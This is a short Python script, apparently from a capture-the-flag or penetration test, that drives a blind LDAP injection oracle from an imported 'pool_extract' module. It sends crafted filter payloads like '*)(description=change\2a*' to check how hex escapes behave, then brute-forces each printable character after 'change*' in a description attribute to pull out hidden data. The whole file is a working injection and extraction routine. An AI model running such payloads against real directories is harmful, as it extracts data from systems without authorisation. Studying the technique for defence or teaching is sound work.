#!/usr/bin/env python3
import pool_extract as P

P.init_pool()

print("=== is \\2a a literal escape or a wildcard? ===", flush=True)
tests = [
    ("*)(description=change\\2a*", "\\2a -> expect True (we know this matches)"),
    ("*)(description=change\\2a\\2a*", "\\2a\\2a -> literal 'change**' vs wildcard"),
    ("*)(description=change\\2b*", "\\2b ('+') -> True means escapes act as wildcards"),
    ("*)(description=change\\2e*", "\\2e ('.') -> True means escapes act as wildcards"),
    ("*)(description=change\\2c*", "\\2c (',') -> True means escapes act as wildcards"),
]
for inj, note in tests:
    print(f"{P.oracle(inj)!s:5s} {note}", flush=True)

print("\n=== characters following the literal '*' ===", flush=True)
after = "change\\2a"
hits = []
for code in list(range(0x20, 0x7F)) + [0x09, 0x0A, 0x0D]:
    c = chr(code)
    if c in "*()\\":
        continue
    if P.oracle(f"*)(description={after}{c}*"):
        hits.append(c)
        print(f"  HIT {c!r} 0x{code:02x}", flush=True)
print(f"candidates after 'change*': {hits}", flush=True)
print(f"requests: {P.REQ[0]}", flush=True)
